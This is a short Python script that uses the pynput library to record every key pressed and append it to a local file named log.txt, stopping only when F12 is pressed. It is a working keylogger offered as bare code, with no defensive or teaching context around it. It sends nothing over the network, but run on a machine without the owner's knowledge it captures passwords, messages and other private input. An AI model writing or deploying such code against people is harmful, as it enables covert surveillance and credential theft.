from pynput.keyboard import Listener

def anonymous(key):
	key = str(key)
	key = key.replace("'","")
	if key =='Key.f12': raise SystemExit(0)
	if key == 'Key.enter': key = '\n'
	if key == 'Key.tab': key = '\n'
	if key == 'Key.ctrl_l': key = '\n'
	if key == 'Key.alt_t': key = '\n'
	with open('log.txt', 'a') as file: file.write(key)
	#print(key)

with Listener(on_press=anonymous) as listener:
	listener.join()